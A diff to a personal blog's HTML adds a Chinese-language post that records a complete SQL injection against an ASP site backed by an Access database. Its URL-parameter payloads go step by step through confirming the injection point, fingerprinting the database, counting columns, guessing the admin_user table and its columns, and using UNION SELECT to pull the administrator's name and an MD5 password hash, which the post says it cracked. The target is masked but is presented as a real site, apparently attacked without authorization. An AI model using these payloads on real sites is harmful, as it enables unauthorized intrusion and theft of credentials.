@@ -259,6 +259,204 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/the-first-accessInjection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="PippyBear">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PippyBear的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/25/the-first-accessInjection/" itemprop="url">纪录一次完整的access注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-25T16:11:40+08:00">
+                2019-07-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/07/25/the-first-accessInjection/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/07/25/the-first-accessInjection/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>目标站点：<a href="https://www.xxx.com/" target="_blank" rel="noopener">https://www.xxx.com/</a><br>注入点：<a href="https://www.xxx.com/common.asp?id=27" target="_blank" rel="noopener">https://www.xxx.com/common.asp?id=27</a></p>
+<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27<span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/1.jpg" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27+and+1=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/2.jpg" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27+and+1=0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/3.jpg" alt></p>
+<p>确定这是一个注入点。</p>
+<h2 id="判断数据库"><a href="#判断数据库" class="headerlink" title="判断数据库"></a>判断数据库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=27+and+(select+count(*)+from+msysobjects)&gt;0  </span><br><span class="line">返回正常，则为mssql</span><br><span class="line">不正常，为access</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/2-1.jpg" alt><br>确定数据库为access数据库</p>
+<h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><h3 id="order-by爆字段"><a href="#order-by爆字段" class="headerlink" title="order by爆字段"></a>order by爆字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27+order+by+7%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/4.jpg" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27+order+by+8%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/5.jpg" alt><br>确定字段是7。</p>
+<h3 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27+and+exists(select+*+from+admin)%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/6.jpg" alt><br>经过多次尝试（这里可以爆破）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27+and+exists(select+*+from+admin_user)%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/7.jpg" alt><br>猜测出admin_user表。</p>
+<h3 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27+and+exists(select+id+from+admin_user)%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/8.jpg" alt><br>存在id列</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27+and+exists(select+username+from+admin_user)%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/9.jpg" alt><br>不存在username，多次尝试（可爆破）。得出至少有id、admin、password三列。</p>
+<h3 id="爆用户名，密码"><a href="#爆用户名，密码" class="headerlink" title="爆用户名，密码"></a>爆用户名，密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27+union+select+1,2,3,4,5,6,7+from+admin_user%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/10.jpg" alt><br>确定可显字段是2,3。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=27+union+select+1,admin,password,4,5,6,7+from+admin_user%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/07/25/the-first-accessInjection/11.jpg" alt><br>最终得出账户admin以及密码（MD5解密）。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/12/job-first-bypass/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -677,7 +875,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
